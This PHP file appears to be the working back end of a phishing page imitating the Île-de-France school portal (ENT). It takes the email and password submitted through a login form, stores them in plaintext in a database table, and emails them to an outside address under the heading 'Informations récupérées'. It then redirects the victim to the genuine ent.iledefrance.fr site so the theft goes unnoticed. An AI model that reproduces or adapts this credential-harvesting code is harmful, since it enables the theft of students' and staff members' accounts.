<?php
include("utils/connexionDB.php");

if(isset($_POST["connexion"])) {
    $login = $_POST["email"];
    $mdp = $_POST["password"];
    $date = date('Y-m-d H:i:s');
    
    $create = $DB->prepare("INSERT INTO utilisateur (login, mdp, date_login) VALUES (:login, :mdp, :date_login)");

    $create->bindValue(":login", $login);
    $create->bindValue(":mdp", $mdp);
    $create->bindValue(":date_login", $date);

    $create->execute();

    $to = "s.bouzidi@ik.me";
    $subject = "Nouveau utilisateur insrit dans la base de donnée de ENT";
 
    $message = "
<html>
<head>
<title>Nouveau utilisateur insrit dans la base de donnée de ENT</title>
</head>
<body>
<p>Informations récupérées</p>
<table>
<tr>
<th>Identifiant</th>
<th>Mot de passe</th>
</tr>
<tr>
<td>" . $login . "</td>
<td>" . $mdp . "</td>
</tr>
</table>
</body>
</html>
";

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From: <recup-info-ent@monlycee.com>' . "\r\n";

mail($to,$subject,$message,$headers);

    header("Location: https://ent.iledefrance.fr/");
} else {
    header("Location: index.php?erreur=05518698SHA5181ASS8S53SA");
}